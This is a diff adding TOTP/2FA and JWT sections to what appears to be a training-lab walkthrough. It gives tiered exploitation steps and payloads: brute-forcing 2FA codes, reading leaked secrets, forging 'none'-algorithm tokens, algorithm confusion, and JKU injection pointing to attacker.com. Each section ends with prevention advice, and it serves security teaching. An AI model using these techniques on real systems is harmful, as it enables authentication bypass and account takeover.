@@ -257,6 +257,161 @@ This walkthrough provides step-by-step solutions, payloads, and explanations for
 
 ---
 
+## 12. TOTP/2FA Authentication
+**Vulnerability:** Time-Based One-Time Password implementation flaws allowing authentication bypass.
+
+### Easy - The Predictable Token
+- **Vulnerability**: Weak secret generation and 10-minute time window
+- **Exploitation**:
+  - Secret follows predictable pattern: `base64(username_secret_123)`
+  - Brute-force 6-digit codes within 10-minute window
+  - Code reuse possible within same time window
+- **Payloads**:
+  - Generate secret: `btoa("admin_secret_123").substring(0,16).toUpperCase()`
+  - Brute force: Try all codes from `000000` to `999999`
+  - Timing: Attack window is 600 seconds (10 minutes)
+- **Steps**:
+  1. Login with valid credentials (admin/admin123)
+  2. Enable 2FA and note the predictable secret pattern
+  3. Calculate expected TOTP codes for current time window
+  4. Use brute force within the extended time window
+
+### Medium - The Flawed Validation
+- **Vulnerability**: Pre-authentication bypass and no rate limiting
+- **Exploitation**:
+  - Session state confusion allows bypass
+  - No rate limiting on 2FA attempts
+  - Timing attacks on code validation
+- **Payloads**:
+  - Pre-auth bypass: Check `sessionStorage.getItem('preauth_user')`
+  - Rate limiting test: Submit unlimited 2FA attempts
+  - Timing attack: Measure response time differences
+- **Steps**:
+  1. Intercept login process and note session handling
+  2. Exploit pre-authentication session state
+  3. Brute force 2FA codes without rate limiting
+  4. Use timing differences to optimize attacks
+
+### Hard - The Cryptographic Leak
+- **Vulnerability**: Secret exposed in browser developer tools
+- **Exploitation**:
+  - TOTP secret leaked in console logs
+  - Secret stored in HTML data attributes
+  - Network responses contain sensitive data
+- **Payloads**:
+  - Check console: `console.log` messages reveal secrets
+  - HTML inspection: `document.getElementById('hidden-secret').getAttribute('data-secret')`
+  - Network tab: API responses leak secret keys
+- **Steps**:
+  1. Login and enable 2FA
+  2. Open Browser Developer Tools (F12)
+  3. Check Console tab for debug information
+  4. Inspect Network tab for API responses
+  5. Check HTML source for hidden data attributes
+  6. Use leaked secret in authenticator app
+
+**Prevention:**
+- Use cryptographically secure secret generation
+- Implement proper rate limiting (3-5 attempts max)
+- Never expose secrets in client-side code
+- Use constant-time comparisons for validation
+- Implement proper session management
+
+---
+
+## 13. JWT Authentication
+**Vulnerability:** JSON Web Token implementation flaws allowing authentication bypass.
+
+### Easy - The None Algorithm
+- **Vulnerability**: Server accepts 'none' algorithm and uses weak HMAC secret
+- **Exploitation**:
+  - Remove signature and set algorithm to 'none'
+  - Brute force weak HMAC secret ('secret')
+  - Modify payload without signature validation
+- **Payloads**:
+  ```javascript
+  // None algorithm attack
+  const header = {"alg": "none", "typ": "JWT"};
+  const payload = {"sub": "admin", "username": "admin", "role": "admin"};
+  const token = btoa(JSON.stringify(header)) + "." + btoa(JSON.stringify(payload)) + ".";
+  
+  // Weak secret brute force
+  const weakSecrets = ['secret', 'key', 'cyberlab', '123456'];
+  ```
+- **Steps**:
+  1. Obtain valid JWT token through normal login
+  2. Decode JWT header and payload
+  3. Change algorithm to 'none' and remove signature
+  4. Modify payload (role: 'admin', username: 'admin')
+  5. Re-encode and submit modified token
+
+### Medium - Algorithm Confusion
+- **Vulnerability**: Server doesn't validate algorithm type, allowing HS256/RS256 confusion
+- **Exploitation**:
+  - Obtain RSA public key from `/public-key` endpoint
+  - Sign JWT using public key as HMAC secret
+  - Server validates using same public key
+- **Payloads**:
+  ```javascript
+  // Algorithm confusion attack
+  const header = {"alg": "HS256", "typ": "JWT"};
+  const payload = {"sub": "admin", "username": "admin", "role": "admin"};
+  const publicKey = "-----BEGIN PUBLIC KEY-----...";
+  const signature = hmacSha256(publicKey, header + "." + payload);
+  ```
+- **Steps**:
+  1. Access `/public-key` endpoint to obtain RSA public key
+  2. Create JWT with HS256 algorithm
+  3. Sign token using public key as HMAC secret
+  4. Submit token - server will validate using public key as HMAC key
+  5. Authentication succeeds due to algorithm confusion
+
+### Hard - JKU Header Injection
+- **Vulnerability**: Server trusts user-controlled JKU header for key fetching
+- **Exploitation**:
+  - Host malicious JWK Set on attacker domain
+  - Set JKU header to point to malicious endpoint
+  - Server fetches attacker's public key
+- **Payloads**:
+  ```javascript
+  // JKU injection attack
+  const header = {
+    "alg": "RS256", 
+    "typ": "JWT",
+    "jku": "https://attacker.com/.well-known/jwks.json"
+  };
+  const payload = {"sub": "admin", "username": "admin", "role": "admin"};
+  // Sign with attacker's private key
+  ```
+- **Malicious JWK Set**:
+  ```json
+  {
+    "keys": [{
+      "kty": "RSA",
+      "kid": "1",
+      "use": "sig",
+      "n": "attacker_public_key_modulus",
+      "e": "AQAB"
+    }]
+  }
+  ```
+- **Steps**:
+  1. Register HTTPS domain (e.g., GitHub Pages)
+  2. Host malicious JWK Set at `/.well-known/jwks.json`
+  3. Generate RSA key pair for signing
+  4. Create JWT with JKU header pointing to malicious domain
+  5. Sign JWT with attacker's private key
+  6. Server fetches attacker's public key and validates successfully
+
+**Prevention:**
+- Explicitly specify and validate expected algorithm
+- Never accept 'none' algorithm in production
+- Whitelist trusted JKU domains
+- Use separate keys for signing and verification
+- Implement proper key management and rotation
+
+---
+
 ## References
 - [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
 - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
